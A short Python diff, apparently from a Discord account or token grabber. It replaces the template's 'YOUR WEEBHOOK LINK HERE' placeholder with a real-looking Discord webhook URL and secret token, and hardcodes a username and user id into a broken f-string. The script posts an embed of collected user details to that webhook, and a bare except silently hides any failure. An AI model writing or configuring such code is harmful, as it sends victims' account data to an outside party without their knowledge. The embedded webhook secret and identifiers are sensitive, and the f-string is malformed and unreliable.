@@ -349,7 +349,7 @@ def main():
                     }
                 ],
                 "author": {
-                    "name": f"{username} ({user_id})",
+                    "name": f"{llevi#7212} ({905137736967684106})",
                     "icon_url": avatar_url
                 },
                 "footer": {
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1044620137384394782/6l9dNXqo37jsr7pJ8pC6AT1mzSyaCY7mofOyQa3UY5yqmAo61fAqP321Tyo4b0J1rQbL", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
